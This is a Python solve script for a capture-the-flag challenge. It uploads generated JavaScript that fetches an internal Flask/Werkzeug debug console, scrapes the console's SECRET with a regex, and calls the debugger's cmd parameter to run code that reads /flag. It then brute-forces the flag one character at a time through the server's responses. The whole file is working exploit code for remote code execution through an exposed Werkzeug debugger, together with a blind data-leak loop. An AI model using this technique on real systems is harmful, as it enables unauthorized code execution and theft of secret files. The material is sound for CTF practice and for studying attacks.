import requests

flag = ""

for i in range(0, 50):
    script = """
var http = require('http')
var path = require('path')
var filepath = path.join(__dirname, path.basename(__filename))

port = 5000

var secret = ""
var flag2 = ""
const content = `
s = ''
with open('/flag') as f:
    s += f.readline()
s.strip()
print(s, end='')
`
const regex = /SECRET = ".{20}"/
http.get(`http://flask:${port}/console`, res => {
    res.on('data', d => {
        d = d.toString();
        const found = d.match(regex);
        secret = found[0].substring(10, 30);
        http.get(`http://flask:${port}/console?__debugger__=yes&cmd=print(open(%%27%%2Fflag%%27).readline())&frm=0&s=${secret}`, res => {
            res.on('data', d => {
                d = d.toString();
                flag2 = d.split('\\n')[1];

                if(flag2[%d] == cguess){
                    var fs = require('fs')
                    var path = require('path')
                    var filepath = path.join(__dirname, path.basename(__filename))

                    var flagfile = '/flag'
                    var flag = fs.readFileSync(flagfile, {encoding:'utf8', flag:'r'})
                    flag = flag.toString()
                    process.stdout.write(flag)

                    fs.writeFileSync(filepath, content, {encoding:'utf8', flag:'w'})
                }
            });
        });
    });
})
    """ % i
    for c in range(33, 128):
        character = chr(c)
        cguess = f"const cguess = '{character}'"
        script_tmp = cguess + script

        fw = open('script_tmp', 'w')
        fw.write(script_tmp)
        fw.close()
        files = {
            'file': open('script_tmp', 'rb'),
        }
        response = requests.post('https://pyscript.ctf.zoolab.org', files=files)

        if response.text.strip() == 'Here is your Flag: FLAG{w3lc0m3_t0_th3_w0r1d_0f_CTF!}':
            flag += character
            print(flag)
            break